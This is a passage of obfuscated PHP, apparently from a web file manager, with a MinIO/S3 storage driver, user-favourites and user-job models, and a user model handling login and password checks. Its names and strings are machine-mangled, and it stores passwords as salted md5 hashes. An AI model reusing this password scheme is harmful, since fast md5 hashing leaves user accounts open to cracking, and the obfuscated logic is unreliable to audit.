$¥ÎÓ§ö€, $¼Ì·š¾¦[238] => $í›É˜Üâ[$¼Ì·š¾¦[238]], $¼Ì·š¾¦[250] => $³ÈÃ¢Ş¢); } public function getHost() { return parent::getHost() . $_SERVER[”ôÑ§ì¸][8] . $this->bucket; } public function size($ßşìĞœ›) { $¿î‚¡ò = $this->objectMeta($ßşìĞœ›); return $¿î‚¡ò ? $¿î‚¡ò[$_SERVER[”ôÑ§ì¸][76]] : 0; } public function info($—õ€°Å“) { if ($this->isFolder($—õ€°Å“)) { return $this->folderInfo($—õ€°Å“); } else { if ($this->isFile($—õ€°Å“)) { return $this->fileInfo($—õ€°Å“); } } return !1; } public function exist($áàø¯—Û) { return $this->isFile($áàø¯—Û) || $this->isFolder($áàø¯—Û); } public function isFile($Ì‘áéã) { return !$this->isFolder($Ì‘áéã) && $this->objectMeta($Ì‘áéã); } public function isFolder($çØÜåËÈ) { return $this->cacheMethod($_SERVER[”ôÑ§ì¸][165], $çØÜåËÈ); } protected function objectMeta($å£áã—ğ) { return $this->cacheMethod($_SERVER[”ôÑ§ì¸][167], $å£áã—ğ); } protected function _objectMeta($Ü×»Ù”) { $ÖûÔÍ·ß =& $_SERVER[”ôÑ§ì¸]; $Ü×»Ù” = rtrim($Ü×»Ù”, $ÖûÔÍ·ß[8]); try { $‡í«˜¬ = $this->client->getObjectInfo($this->bucket, $Ü×»Ù”); if (!isset($‡í«˜¬[$ÖûÔÍ·ß[235]]) && isset($‡í«˜¬[$ÖûÔÍ·ß[251]])) { $‡í«˜¬[$ÖûÔÍ·ß[235]] = $‡í«˜¬[$ÖûÔÍ·ß[251]]; } } catch (Exception $¥ğË¨€Å) { $‡í«˜¬ = !1; } if (!$‡í«˜¬) { } return $‡í«˜¬; } protected function _isFolder($”êú€ã) { $©›ÕŞ¶Ì =& $_SERVER[”ôÑ§ì¸]; $”êú€ã = rtrim($”êú€ã, $©›ÕŞ¶Ì[8]); if ($”êú€ã == $©›ÕŞ¶Ì[12] || $”êú€ã == $©›ÕŞ¶Ì[8]) { return !0; } $Åöµæ¸» = $this->client->getBucket($this->bucket, $”êú€ã, null, 1); if (empty($Åöµæ¸»[$©›ÕŞ¶Ì[219]])) { return !1; } $Òœƒü«™ = $Åöµæ¸»[$©›ÕŞ¶Ì[219]][0][$©›ÕŞ¶Ì[32]]; return stripos($Òœƒü«™, $”êú€ã . $©›ÕŞ¶Ì[8]) === 0 ? !0 : !1; if (substr($Òœƒü«™, -1) == $©›ÕŞ¶Ì[8]) { return !0; } if (get_path_this($Òœƒü«™) == get_path_this($”êú€ã)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($şŸøœÀÚ) { parent::__construct($şŸøœÀÚ); $this->signatureVersion($_SERVER[”ôÑ§ì¸][230]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($§¸šÀĞØ, $®ÛêàÆ‡ = 3600) { $ıî¶²Î =& $_SERVER[”ôÑ§ì¸]; $–í²˜ÃÄ = $ıî¶²Î[212]; $•Òä€’– = $ıî¶²Î[252]; $è´İéªñ = $ıî¶²Î[62]; $ñØİÚË© = gmdate($ıî¶²Î[253]); $Ù¼”öÉ² = gmdate($ıî¶²Î[254]); $®Û³úıÁ = $ıî¶²Î[255]; $Ì×‚òÕ = $®ÛêàÆ‡ . $ıî¶²Î[12]; $¨ŸØÂãñ = $ıî¶²Î[256]; $Ò›®ıÆ = array($this->accessKey, $Ù¼”öÉ², $this->region, $è´İéªñ, $®Û³úıÁ); $æñ²®ë¬ = implode($ıî¶²Î[8], $Ò›®ıÆ); $˜­å±‡ = array($ıî¶²Î[257] => gmdate($ıî¶²Î[258], strtotime($ıî¶²Î[259])), $ıî¶²Î[260] => array(array($ıî¶²Î[261] => $this->bucket), array($ıî¶²Î[262] => $–í²˜ÃÄ), array($ıî¶²Î[263], $ıî¶²Î[264], $ıî¶²Î[12]), array($ıî¶²Î[263], $ıî¶²Î[265], $ıî¶²Î[12]), array($ıî¶²Î[263], $ıî¶²Î[266], $ıî¶²Î[12]), array($ıî¶²Î[267] => $¨ŸØÂãñ), array($ıî¶²Î[268] => $æñ²®ë¬), array($ıî¶²Î[269] => $•Òä€’–), array($ıî¶²Î[270] => $ñØİÚË©), array($ıî¶²Î[271] => $Ì×‚òÕ))); $âÏ™İİ = base64_encode(json_encode($˜­å±‡)); $À¿î¨¤¯ = hash_hmac($ıî¶²Î[272], $Ù¼”öÉ², $ıî¶²Î[273] . $this->secret, !0); $Ù­ÈÔÁ = hash_hmac($ıî¶²Î[272], $this->region, $À¿î¨¤¯, !0); $®ïæÙ‘ = hash_hmac($ıî¶²Î[272], $è´İéªñ, $Ù­ÈÔÁ, !0); $õ÷¦×” = hash_hmac($ıî¶²Î[272], $®Û³úıÁ, $®ïæÙ‘, !0); $£ğ­ôİ = hash_hmac($ıî¶²Î[272], $âÏ™İİ, $õ÷¦×”); $ØğĞäµµ = array($ıî¶²Î[229] => $ıî¶²Î[12], $ıî¶²Î[274] => $ıî¶²Î[12], $ıî¶²Î[262] => $–í²˜ÃÄ, $ıî¶²Î[267] => $¨ŸØÂãñ, $ıî¶²Î[275] => $âÏ™İİ, $ıî¶²Î[276] => $æñ²®ë¬, $ıî¶²Î[277] => $•Òä€’–, $ıî¶²Î[278] => $ñØİÚË©, $ıî¶²Î[279] => $Ì×‚òÕ, $ıî¶²Î[280] => $£ğ­ôİ, $ıî¶²Î[195] => $this->getHost()); return $ØğĞäµµ; } } goto DÉÊ¹ğÈµì; C‚èôÕÂÊ: class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($ºøµ‰æ‘) { $ –ªÅ¨ú =& $_SERVER[”ôÑ§ì¸]; return array($ –ªÅ¨ú[1977] => array(USER_ID, $ –ªÅ¨ú[2315])); } protected function listData() { $Àó µÂ =& $_SERVER[”ôÑ§ì¸]; $œãÕøàŠ = array($Àó µÂ[1665] => USER_ID, $Àó µÂ[524] => 0); $ÑÌÕºø² = $Àó µÂ[2316]; $ÉşÂ¸µ‡ = $this->field($ÑÌÕºø²)->where($œãÕøàŠ)->order($Àó µÂ[2317])->select(); return $ÉşÂ¸µ‡ ? $ÉşÂ¸µ‡ : array(); } protected function resetCache() { } protected function listView() { $³ÉÖˆÙ =& $_SERVER[”ôÑ§ì¸]; $ıÌ´Ç½ = $this->listData(); $¡ÖÜæÚ‘ = array_filter_by_field($ıÌ´Ç½, $³ÉÖˆÙ[33], $³ÉÖˆÙ[457]); $üÅàœè­ = array_to_keyvalue($¡ÖÜæÚ‘, $³ÉÖˆÙ[12], $³ÉÖˆÙ[84]); if (!$üÅàœè­) { return $ıÌ´Ç½; } $‹Ü”ß = 2000; $©¤Ê“÷¡ = array($³ÉÖˆÙ[458] => array($³ÉÖˆÙ[459], $üÅàœè­)); $Ğ£×­²Ä = Model($³ÉÖˆÙ[847])->listSource($©¤Ê“÷¡, $‹Ü”ß); $Ğ£×­²Ä = array_merge($Ğ£×­²Ä[$³ÉÖˆÙ[83]], $Ğ£×­²Ä[$³ÉÖˆÙ[82]]); $Ğ£×­²Ä = array_to_keyvalue($Ğ£×­²Ä, $³ÉÖˆÙ[180]); foreach ($ıÌ´Ç½ as $ĞÔ—ËÀ¥ => $Ëê¿É¤×) { $’üÄ¬İ = $Ğ£×­²Ä[$Ëê¿É¤×[$³ÉÖˆÙ[84]]]; $’üÄ¬İ = $’üÄ¬İ ? $’üÄ¬İ : array(); $ıÌ´Ç½[$ĞÔ—ËÀ¥] = array_merge($’üÄ¬İ, $Ëê¿É¤×); } return $ıÌ´Ç½; } protected function addFav($ß¤©Çø, $ÊÇñãÅó = '', $ÊÂ»¬«õ = "\163\157\x75\162\x63\145") { $Ê÷Ğ»Æ =& $_SERVER[”ôÑ§ì¸]; $ˆ•€Áòî = array($Ê÷Ğ»Æ[1665] => USER_ID, $Ê÷Ğ»Æ[524] => 0, $Ê÷Ğ»Æ[463] => $ÊÂ»¬«õ, $Ê÷Ğ»Æ[462] => $ß¤©Çø); if ($this->where($ˆ•€Áòî)->find()) { return !1; } $ˆ•€Áòî = array($Ê÷Ğ»Æ[1665] => USER_ID, $Ê÷Ğ»Æ[524] => 0); $şÅ¡Ï¯ = $this->where($ˆ•€Áòî)->max($Ê÷Ğ»Æ[1890]); if (!$şÅ¡Ï¯) { $şÅ¡Ï¯ = 0; } if (!$ÊÇñãÅó && $ÊÂ»¬«õ == $Ê÷Ğ»Æ[457]) { $Ùö¦Ó¸õ = Model($Ê÷Ğ»Æ[1363])->where(array($Ê÷Ğ»Æ[458] => $ß¤©Çø))->find(); if (!$Ùö¦Ó¸õ) { return !1; } $ÊÇñãÅó = $Ùö¦Ó¸õ[$Ê÷Ğ»Æ[32]]; } $ÊÇñãÅó = $this->getAutoName($ÊÇñãÅó); $ïšİ­¢ = array($Ê÷Ğ»Æ[1665] => USER_ID, $Ê÷Ğ»Æ[524] => 0, $Ê÷Ğ»Æ[461] => $ÊÇñãÅó, $Ê÷Ğ»Æ[462] => $ß¤©Çø, $Ê÷Ğ»Æ[463] => $ÊÂ»¬«õ, $Ê÷Ğ»Æ[1870] => $şÅ¡Ï¯ + 1); return $this->add($ïšİ­¢); } protected function remove($Ş™û—§Ì) { $İÔª÷½¸ =& $_SERVER[”ôÑ§ì¸]; $—«Ù›äÌ = array($İÔª÷½¸[1665] => USER_ID, $İÔª÷½¸[460] => $Ş™û—§Ì); return $this->where($—«Ù›äÌ)->delete(); } protected function removeByName($¥µÔó¸) { $Ô‰™óÅ® =& $_SERVER[”ôÑ§ì¸]; $ÇŞˆò¬— = array($Ô‰™óÅ®[1665] => USER_ID, $Ô‰™óÅ®[461] => $¥µÔó¸, $Ô‰™óÅ®[524] => 0); return $this->where($ÇŞˆò¬—)->delete(); } protected function rename($´ùí«œß, $ñ¨±…¨‰) { $Â„ûî›¹ =& $_SERVER[”ôÑ§ì¸]; if ($´ùí«œß == $ñ¨±…¨‰) { return !1; } $û®Š¶›ù = $this->getAutoName($ñ¨±…¨‰); if ($ñ¨±…¨‰ != $û®Š¶›ù) { return !1; } $ â“…¿’ = array($Â„ûî›¹[1665] => USER_ID, $Â„ûî›¹[524] => 0, $Â„ûî›¹[32] => $´ùí«œß); return $this->where($ â“…¿’)->save(array($Â„ûî›¹[32] => $ñ¨±…¨‰)); } protected function resetSort($—Ü£ƒ·£) { $êî¸ŒÕÙ =& $_SERVER[”ôÑ§ì¸]; $—Ü£ƒ·£ = is_array($—Ü£ƒ·£) ? $—Ü£ƒ·£ : array(); $ØêóØ° = array($êî¸ŒÕÙ[1665] => USER_ID); for ($°¼ë”¼‚ = 0; $°¼ë”¼‚ < count($—Ü£ƒ·£); $°¼ë”¼‚++) { $ØêóØ°[$êî¸ŒÕÙ[460]] = $—Ü£ƒ·£[$°¼ë”¼‚]; $this->where($ØêóØ°)->save(array($êî¸ŒÕÙ[1870] => $°¼ë”¼‚ + 1)); } return !0; } protected function moveTop($Ûò¯ºŸÍ) { $ƒÔˆ¦ë =& $_SERVER[”ôÑ§ì¸]; $¹óÁÀË× = array($ƒÔˆ¦ë[1665] => USER_ID, $ƒÔˆ¦ë[524] => 0); $á¡’Ã = $this->where($¹óÁÀË×)->where(array($ƒÔˆ¦ë[32] => $Ûò¯ºŸÍ))->find(); if (!$á¡’Ã) { return; } $¨ÓÕÏİ = $this->field($ƒÔˆ¦ë[442])->where($¹óÁÀË×)->order($ƒÔˆ¦ë[2317])->select(); $¨ÓÕÏİ = array_to_keyvalue($¨ÓÕÏİ, $ƒÔˆ¦ë[12], $ƒÔˆ¦ë[442]); $”«ÄÒ› = $¨ÓÕÏİ; $¨ÓÕÏİ = array_remove_value($¨ÓÕÏİ, $á¡’Ã[$ƒÔˆ¦ë[442]]); array_unshift($¨ÓÕÏİ, $á¡’Ã[$ƒÔˆ¦ë[442]]); return $this->resetSort($¨ÓÕÏİ); } protected function moveBottom($íªªüÚ¼) { $¢ãòçÔ“ =& $_SERVER[”ôÑ§ì¸]; $¡Ì«áµ¯ = array($¢ãòçÔ“[1665] => USER_ID, $¢ãòçÔ“[524] => 0); $ï¸Ÿ¤æ = $this->where($¡Ì«áµ¯)->max($¢ãòçÔ“[1890]); $Ï¢Ÿ‰ = array($¢ãòçÔ“[1890] => $ï¸Ÿ¤æ + 1); return $this->where($¡Ì«áµ¯)->where(array($¢ãòçÔ“[32] => $íªªüÚ¼))->save($Ï¢Ÿ‰); } private function getAutoName($£°ó³ùÚ) { $¦öåí‘½ =& $_SERVER[”ôÑ§ì¸]; $Š¤Şèœ¬ = array($¦öåí‘½[1665] => USER_ID, $¦öåí‘½[524] => 0); $³™œé†Ğ = $this->field($¦öåí‘½[32])->where($Š¤Şèœ¬)->select(); $³™œé†Ğ = array_to_keyvalue($³™œé†Ğ, $¦öåí‘½[12], $¦öåí‘½[32]); if (!$³™œé†Ğ || !in_array($£°ó³ùÚ, $³™œé†Ğ)) { return $£°ó³ùÚ; } for ($¨ƒ´…ãí = 0; $¨ƒ´…ãí < count($³™œé†Ğ); $¨ƒ´…ãí++) { if (!in_array($£°ó³ùÚ . "\50{$¨ƒ´…ãí}\51", $³™œé†Ğ)) { return $£°ó³ùÚ . "\50{$¨ƒ´…ãí}\x29"; } } return $£°ó³ùÚ . "\50{$¨ƒ´…ãí}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\152\157\142\114\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\144\145\163\143", "\x73\x6f\x72\164"); const JOB_KEY = "\x73\x65\154\146\x4a\157\x62\x4c\x69\x73\164"; public function listData($ˆ®ê• = false, $Ú¤Á‘‚ = "\x73\x6f\162\x74", $¼¥¸Û¨ = false) { return parent::listData($ˆ®ê•, $Ú¤Á‘‚, $¼¥¸Û¨); } public function remove($ñ—“áçÄ) { return parent::remove($ñ—“áçÄ); } public function add($”‡½ƒô) { $¨½¶Ş³‹ =& $_SERVER[”ôÑ§ì¸]; if ($this->findByName($”‡½ƒô[$¨½¶Ş³‹[32]])) { return !1; } $”‡½ƒô[$¨½¶Ş³‹[1890]] = $this->getSort(); return parent::insert($”‡½ƒô); } private function getSort() { $ÑöÃÀŞú =& $_SERVER[”ôÑ§ì¸]; $€æ©¯„Ã = parent::listData(); $•—¡ÕÚŞ = array_to_keyvalue($€æ©¯„Ã, $ÑöÃÀŞú[12], $ÑöÃÀŞú[1890]); return empty($•—¡ÕÚŞ) ? 0 : max($•—¡ÕÚŞ) + 1; } public function update($¾¿§Ë¢, $Ğµğ¯²È) { $˜ò«Öá  =& $_SERVER[”ôÑ§ì¸]; $¸÷ÁÌğ« = parent::listData($¾¿§Ë¢); $Ò½ìÛÌş = $this->findByName($Ğµğ¯²È[$˜ò«Öá [32]]); if (!$¸÷ÁÌğ« || $Ò½ìÛÌş && $Ò½ìÛÌş[$˜ò«Öá [442]] != $¸÷ÁÌğ«[$˜ò«Öá [442]]) { return !1; } return parent::update($¾¿§Ë¢, $Ğµğ¯²È); } public function setUserJob($ æô¤ğÂ, $ğ®‹™³Í) { $ğ»Ş¶´™ =& $_SERVER[”ôÑ§ì¸]; if (!is_array($ğ®‹™³Í)) { $ğ®‹™³Í = array($ğ®‹™³Í); } $ˆåñÚºß = parent::listData(); $°ß½£À„ = array_to_keyvalue($ˆåñÚºß, $ğ»Ş¶´™[32]); $ı­õ©‹˜ = $ğ»Ş¶´™[421]; foreach ($ğ®‹™³Í as $°ßâ…ÛÛ) { if ($°ß½£À„[$°ßâ…ÛÛ]) { $ı­õ©‹˜ .= $°ß½£À„[$°ßâ…ÛÛ][$ğ»Ş¶´™[442]] . $ğ»Ş¶´™[50]; } else { $Ğãª·˜Ç = $this->add($°ßâ…ÛÛ); $ı­õ©‹˜ .= $Ğãª·˜Ç . $ğ»Ş¶´™[50]; } } $ı­õ©‹˜ = rtrim($ı­õ©‹˜, $ğ»Ş¶´™[50]); Model($ğ»Ş¶´™[566])->metaSet($ æô¤ğÂ, self::JOB_KEY, $ı­õ©‹˜); } public function getUserJob($ªÂğøİÈ) { $’åéÂŒ© = Model($_SERVER[”ôÑ§ì¸][566])->metaGet($ªÂğøİÈ); return $this->getUserJobInfo($’åéÂŒ©[self::JOB_KEY]); } public function getUserJobInfo($”úäÖÌğ) { $òÌÎà¦Œ =& $_SERVER[”ôÑ§ì¸]; $”³û˜È = explode($òÌÎà¦Œ[50], $”úäÖÌğ); $Ó™·¶Ó“ = parent::listData(); $Ó™·¶Ó“ = array_remove_key($Ó™·¶Ó“, $òÌÎà¦Œ[214]); $Ù”ÓƒÚ£ = array(); foreach ($”³û˜È as $ıÈÑ·­Û) { if (isset($Ó™·¶Ó“[$ıÈÑ·­Û])) { $Ù”ÓƒÚ£[] = $Ó™·¶Ó“[$ıÈÑ·­Û]; } } return $Ù”ÓƒÚ£; } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\x61\155\x65" => "\x75\163\x65\x72\x5f\x6d\145\x74\141", "\x6d\145\x74\141\106\x69\145\x6c\144" => "\x75\163\145\x72\111\x44"); protected $simpleField = "\x75\163\x65\162\111\x44\54\x6e\151\x63\153\116\x61\155\145\x2c\156\x61\x6d\x65\54\x61\x76\141\164\141\162\54\163\145\x78\x2c\163\x74\141\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($’ÓùœÇ®) { $üß¶šøÂ =& $_SERVER[”ôÑ§ì¸]; $“©Ú‘¸¶ = $üß¶šøÂ[2318]; return array($üß¶šøÂ[1944] => array($’ÓùœÇ®[0], $“©Ú‘¸¶), $üß¶šøÂ[1946] => array($’ÓùœÇ®[0], $“©Ú‘¸¶), $üß¶šøÂ[2319] => array($’ÓùœÇ®[0], $“©Ú‘¸¶)); } protected function getInfo($¯û‘•¿é, $…ÈÒÈ”‹ = false) { $½şèœÖå = $this->getInfoSimple($¯û‘•¿é); if (!is_array($½şèœÖå)) { return array(); } if ($…ÈÒÈ”‹) { return $this->_getInfoApply($½şèœÖå); } return $this->cacheFunctionGet($_SERVER[”ôÑ§ì¸][1948], $¯û‘•¿é); } protected function getInfoFull($ºíåŸ³œ, $µà–Û’Õ = false) { $¿½èˆ•´ = $this->getInfoSimple($ºíåŸ³œ); if (!is_array($¿½èˆ•´)) { return array(); } if ($µà–Û’Õ) { return $this->_getInfoApply($¿½èˆ•´, !0); } return $this->cacheFunctionGet($_SERVER[”ôÑ§ì¸][2320], $ºíåŸ³œ); } private function _getInfoApply($ï…éÂôÁ, $Àüõ€è = false) { $ğ¨ÇÖÒ¿ =& $_SERVER[”ôÑ§ì¸]; if (!$ï…éÂôÁ) { return $ï…éÂôÁ; } $ú±Ù¡â = md5($ğ¨ÇÖÒ¿[2321] . $ï…éÂôÁ[$ğ¨ÇÖÒ¿[920]] . $ğ¨ÇÖÒ¿[2322] . $ï…éÂôÁ[$ğ¨ÇÖÒ¿[32]]); $ï…éÂôÁ = $this->_listDataApplyItem($ï…éÂôÁ); $»¹’œœ‡ = Model($ğ¨ÇÖÒ¿[1363])->metaGet($ï…éÂôÁ[$ğ¨ÇÖÒ¿[87]][$ğ¨ÇÖÒ¿[180]]); $ï…éÂôÁ[$ğ¨ÇÖÒ¿[2323]] = $ú±Ù¡â; $ï…éÂôÁ[$ğ¨ÇÖÒ¿[87]][$ğ¨ÇÖÒ¿[2140]] = isset($»¹’œœ‡[$ğ¨ÇÖÒ¿[2141]]) ? $»¹’œœ‡[$ğ¨ÇÖÒ¿[2141]] : null; if ($Àüõ€è) { $ï…éÂôÁ[$ğ¨ÇÖÒ¿[506]] = $this->metaGet($ï…éÂôÁ[$ğ¨ÇÖÒ¿[1674]]); } return $ï…éÂôÁ; } protected function getInfoSimple($şÌ·à§Ê, $æ«­¼Œ = false) { $Š®…Š‚ =& $_SERVER[”ôÑ§ì¸]; if (!$şÌ·à§Ê) { return array(); } if ($æ«­¼Œ) { $ØèŸ€×” = $this->where(array($Š®…Š‚[1674] => intval($şÌ·à§Ê)))->find(); if (!is_array($ØèŸ€×”)) { return array(); } $ØèŸ€×”[$Š®…Š‚[2324]] = Action($Š®…Š‚[2325])->parseUrl($ØèŸ€×”[$Š®…Š‚[2324]]); return $ØèŸ€×”; } return $this->cacheFunctionGet($Š®…Š‚[1949], $şÌ·à§Ê); } protected function getInfoSimpleOuter($“İÈâ”¼) { $Îáµ°ß³ =& $_SERVER[”ôÑ§ì¸]; if (!$“İÈâ”¼ || $“İÈâ”¼ == 0) { return array($Îáµ°ß³[1674] => $Îáµ°ß³[211], $Îáµ°ß³[32] => $Îáµ°ß³[162] . LNG($Îáµ°ß³[2326]) . $Îáµ°ß³[164], $Îáµ°ß³[2324] => STATIC_PATH . $Îáµ°ß³[2327]); } $±ß˜Ô¡À = $this->cacheFunctionGet($Îáµ°ß³[1949], $“İÈâ”¼); $¥¯º‹Êß = array_field_key($±ß˜Ô¡À, explode($Îáµ°ß³[50], $this->simpleField)); if (!$¥¯º‹Êß) { return array($Îáµ°ß³[1674] => $Îáµ°ß³[1219], $Îáµ°ß³[32] => $Îáµ°ß³[162] . LNG($Îáµ°ß³[2328]) . $Îáµ°ß³[164], $Îáµ°ß³[2324] => STATIC_PATH . $Îáµ°ß³[2329]); } $¥¯º‹Êß[$Îáµ°ß³[2324]] = Action($Îáµ°ß³[2325])->parseUrl($¥¯º‹Êß[$Îáµ°ß³[2324]]); return $¥¯º‹Êß; } protected function groupUser($‡æ‚Óî) { } public static function errorLang($•õá¤ò›) { $ñÇ—­´¸ =& $_SERVER[”ôÑ§ì¸]; $‹š†ëÁÉ = array(self::ERROR_USER_NOT_EXISTS => $ñÇ—­´¸[2330], self::ERROR_USER_PASSWORD_ERROR => $ñÇ—­´¸[2331], self::ERROR_USER_EXIST_NAME => $ñÇ—­´¸[2332], self::ERROR_USER_EXIST_PHONE => $ñÇ—­´¸[2333], self::ERROR_USER_EXIST_EMAIL => $ñÇ—­´¸[2334], self::ERROR_USER_LOGIN_LOCK => $ñÇ—­´¸[2335], self::ERROR_IP_NOT_ALLOW => $ñÇ—­´¸[2336], self::ERROR_USER_EXIST_NICKNAME => $ñÇ—­´¸[2337]); return LNG($‹š†ëÁÉ[$•õá¤ò›]); } public function getInfoByMeta($äÛ™ç­¯, $ã£•ÕÉè) { $ìòìÍ“ä =& $_SERVER[”ôÑ§ì¸]; $¨‰Î‰›û = Model($ìòìÍ“ä[2338])->where(array($ìòìÍ“ä[94] => $äÛ™ç­¯, $ìòìÍ“ä[417] => $ã£•ÕÉè))->find(); if ($¨‰Î‰›û) { return $this->getInfo($¨‰Î‰›û[$ìòìÍ“ä[1674]]); } return !1; } public function userLoginCheck($ÎüìòÚÈ, $ı™‰şøÉ) { $ÄòĞ¥ =& $_SERVER[”ôÑ§ì¸]; $Ê¸¼şİğ = $this->userLoginFind($ÎüìòÚÈ); if (!$Ê¸¼şİğ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ê¸¼şİğ[$ÄòĞ¥[1674]], $ı™‰şøÉ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Ê¸¼şİğ[$ÄòĞ¥[1674]]); } public function userLoginFind($­¯ä´ªĞ) { $›îŸéóš =& $_SERVER[”ôÑ§ì¸]; $ßƒ‰¦éü = array($›îŸéóš[32] => $­¯ä´ªĞ, $›îŸéóš[2148] => $­¯ä´ªĞ, $›îŸéóš[348] => $­¯ä´ªĞ, $›îŸéóš[2339] => $­¯ä´ªĞ, $›îŸéóš[1031] => $›îŸéóš[1033]); if ($this->nickNameRpt()) { unset($ßƒ‰¦éü[$›îŸéóš[2148]]); } return $this->where($ßƒ‰¦éü)->find(); } public function clearCache($££Ø„²¥) { $ÒÙîçŸ =& $_SERVER[”ôÑ§ì¸]; $this->cacheFunctionClear($ÒÙîçŸ[1948], $££Ø„²¥); $this->cacheFunctionClear($ÒÙîçŸ[1949], $££Ø„²¥); $this->cacheFunctionClear($ÒÙîçŸ[2320], $££Ø„²¥); } public function userPasswordCheck($É¾ôÍÅ, $ñœğæÕÂ) { $ÇÅ±‚¢× =& $_SERVER[”ôÑ§ì¸]; $É²ò£ì× = $this->where(array($ÇÅ±‚¢×[1674] => intval($É¾ôÍÅ)))->find(); $Ÿó»Æüì = $this->metaGet($É¾ôÍÅ); $øõ—ÂÚ‘ = isset($Ÿó»Æüì[$ÇÅ±‚¢×[2340]]) ? $Ÿó»Æüì[$ÇÅ±‚¢×[2340]] : $ÇÅ±‚¢×[12]; if (md5($øõ—ÂÚ‘ . trim($ñœğæÕÂ)) !== $É²ò£ì×[$ÇÅ±‚¢×[920]]) { return !1; } return !0; } public function userAdd($ŸáÎõò) { $†úÁÙ½â =& $_SERVER[”ôÑ§ì¸]; $Ûİâ™ñå = array($†úÁÙ½â[461] => $ŸáÎõò[$†úÁÙ½â[32]], $†úÁÙ½â[2341] => $ŸáÎõò[$†úÁÙ½â[1549]], $†úÁÙ½â[2342] => isset($ŸáÎõò[$†úÁÙ½â[348]]) ? $ŸáÎõò[$†úÁÙ½â[348]] : $†úÁÙ½â[12], $†úÁÙ½â[2343] => isset($ŸáÎõò[$†úÁÙ½â[2339]]) ? $ŸáÎõò[$†úÁÙ½â[2339]] : $†úÁÙ½â[12], $†úÁÙ½â[2344] => isset($ŸáÎõò[$†úÁÙ½â[2148]]) ? $ŸáÎõò[$†úÁÙ½â[2148]] : $ŸáÎõò[$†úÁÙ½â[32]], $†úÁÙ½â[2345] => isset($ŸáÎõò[$†úÁÙ½â[2324]]) ? $ŸáÎõò[$†úÁÙ½â[2324]] : $†úÁÙ½â[12], $†úÁÙ½â[2346] => isset($ŸáÎõò[$†úÁÙ½â[2347]]) ? $ŸáÎõò[$†úÁÙ½â[2347]] : 1, $†úÁÙ½â[2348] => $ŸáÎõò[$†úÁÙ½â[920]], $†úÁÙ½â[1950] => isset($ŸáÎõò[$†úÁÙ½â[1853]]) ? $ŸáÎõò[$†úÁÙ½â[1853]] : 1024 * 1024 * 20, $†úÁÙ½â[1951] => 0, $†úÁÙ½â[2349] => 0, $†úÁÙ½â[1995] => isset($ŸáÎõò[$†úÁÙ½â[772]]) ? $ŸáÎõò[$†úÁÙ½â[772]] : 1); if (!empty($ŸáÎõò[$†úÁÙ½â[1674]])) { $Ûİâ™ñå[$†úÁÙ½â[1674]] = $ŸáÎõò[$†úÁÙ½â[1674]]; } $µ†ÍÍí¥ = $this->_checkExist($ŸáÎõò); if ($µ†ÍÍí¥ !== !0) { return $µ†ÍÍí¥; } if (!empty($Ûİâ™ñå[$†úÁÙ½â[2324]]) && strlen($Ûİâ™ñå[$†úÁÙ½â[2324]]) > 255) { $Ûİâ™ñå[$†úÁÙ½â[2324]] = $†úÁÙ½â[12]; } $°Û²İÕ = $this->add($Ûİâ™ñå); $‡£ÃÇ¬“ = array($†úÁÙ½â[2348] => $Ûİâ™ñå[$†úÁÙ½â[920]], $†úÁÙ½â[2344] => $Ûİâ™ñå[$†úÁÙ½â[2148]]); $this->userEdit($°Û²İÕ, $‡£ÃÇ¬“); Model($†úÁÙ½â[1363])->userRootAdd($°Û²İÕ); return $°Û²İÕ; } protected function userEditTest($¦­ÏúÂİ, $§šÂˆ·¤) { return $this->call($_SERVER[”ôÑ§ì¸][2350], $¦­ÏúÂİ, $§šÂˆ·¤); } protected function userEdit($öØé¥ğ‹, $úıÙÅ) { $ä›ıîÛù =& $_SERVER[”ôÑ§ì¸]; $ ¼é’–¨ = $this->getInfoSimple($öØé¥ğ‹); if (!$ ¼é’–¨) { return !1; } $ˆé¤ëà» = $this->_checkExist($úıÙÅ, $öØé¥ğ‹); if ($ˆé¤ëà» !== !0) { return $ˆé¤ëà»; } if (isset($úıÙÅ[$ä›ıîÛù[920]]) && trim($úıÙÅ[$ä›ıîÛù[920]]) != $ä›ıîÛù[12]) { $ç°¸Š›¿ = $this->metaGet($öØé¥ğ‹); if (empty($ç°¸Š›¿[$ä›ıîÛù[2340]])) { $ç°¸Š›¿[$ä›ıîÛù[2340]] = rand_string(10); Model($ä›ıîÛù[545])->metaSet($öØé¥ğ‹, $ä›ıîÛù[2340], $ç°¸Š›¿[$ä›ıîÛù[2340]]); } $úıÙÅ[$ä›ıîÛù[920]] = md5($ç°¸Š›¿[$ä›ıîÛù[2340]] . trim($úıÙÅ[$ä›ıîÛù[920]])); } else { unset($úıÙÅ[$ä›ıîÛù[920]]); } if (!empty($úıÙÅ[$ä›ıîÛù[2324]]) && strlen($úıÙÅ[$ä›ıîÛù[2324]]) > 255) { $úıÙÅ[$ä›ıîÛù[2324]] = $ä›ıîÛù[12]; } $this->where(array($ä›ıîÛù[1665] => $öØé¥ğ‹))->save($úıÙÅ); if (isset($úıÙÅ[$ä›ıîÛù[2148]])) { $this->setNamePinyin($öØé¥ğ‹, $úıÙÅ[$ä›ıîÛù[2148]]); } $this->clearCache($öØé¥ğ‹); return !0; } public function setNamePinyin($ªÑâ•×€, $÷®‡Ã“¶ = false) { $´¸”¾éÀ =& $_SERVER[”ôÑ§ì¸]; if (!$÷®‡Ã“¶) { $Ù¬õ§­‚ = $this->getInfoSimple($ªÑâ•×€); $÷®‡Ã“¶ = $Ù¬õ§­‚[$´¸”¾éÀ[2148]] ? 